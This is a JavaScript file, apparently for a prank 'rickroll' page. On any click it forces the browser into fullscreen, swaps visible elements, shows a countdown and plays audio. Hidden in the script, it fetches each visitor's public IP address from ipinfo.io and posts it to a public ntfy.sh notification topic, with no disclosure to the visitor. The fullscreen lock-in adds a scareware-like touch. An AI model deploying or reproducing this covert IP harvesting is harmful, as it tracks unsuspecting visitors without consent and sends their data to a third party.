function abrirTelaCheia() {
    if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen();
    } else if (document.documentElement.mozRequestFullScreen) {
        document.documentElement.mozRequestFullScreen();
    } else if (document.documentElement.webkitRequestFullscreen) { 
        document.documentElement.webkitRequestFullscreen();
    } else if (document.documentElement.msRequestFullscreen) { 
        document.documentElement.msRequestFullscreen();
    }
}

window.addEventListener("click", abrirTelaCheia);

document.addEventListener("click", function() {
    document.getElementById("lixo").style.display = 'none';
    document.getElementById("gif").style.display = 'block';
    document.getElementById("texto").style.display = 'block';
    document.getElementById("contagem").style.display = 'block';  
});

try {
    fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
        var ipAddress = data.ip; // Correção: pegar apenas o campo 'ip'
        fetch('https://ntfy.sh/rickroll', {
            method: 'POST', 
            headers: {
                'Title': 'IP',
                'Email': 'a@a.com'
            },
            body: ipAddress, 
        });
        console.log(ipAddress);
    })
    .catch(error => {
        alert("Erro: " + error);
    });
} catch (e) {
    alert("Erro: " + e);
}

const audio = document.getElementById("audio");
audio.play().catch(error => {
    console.error("Erro ao iniciar a reprodução do áudio:", error);
});
